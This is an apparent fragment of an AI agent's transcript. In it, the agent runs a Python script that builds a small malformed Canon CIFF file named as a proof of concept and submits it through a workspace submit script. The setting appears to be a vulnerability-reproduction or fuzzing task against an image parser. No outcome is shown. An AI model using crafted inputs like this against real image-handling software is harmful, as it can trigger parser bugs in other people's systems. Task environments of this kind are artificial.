message:
Running command: python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc.ciff')
# minimal CIFF-like input: II + header length + HEAPCCDR + tiny directory with one ASCII entry
b=bytearray()
b += b'II'
b += (12).to_bytes(4,'little')
b += b'HEAPCCDR'
# directory at offset 12: entryCount=1, one 10-byte entry, valueDataSize=0
b += (1).to_bytes(2,'little')
# entry: tag=0x080a (CIFF_MAKEMODEL), datalocation=0x4000 inline, type=ASCII, bytesize=8, data='Canon\0\0\0'
b += (0x080a | 0x4000 | 0x0800).to_bytes(2,'little')
b += (8).to_bytes(4,'little')
b += b'Canon\x00\x00\x00'
b += (0).to_bytes(4,'little')
p.write_bytes(b)
print(p, len(b))
PY
bash /workspace/submit.sh /workspace/poc.ciff; echo EXIT:$?
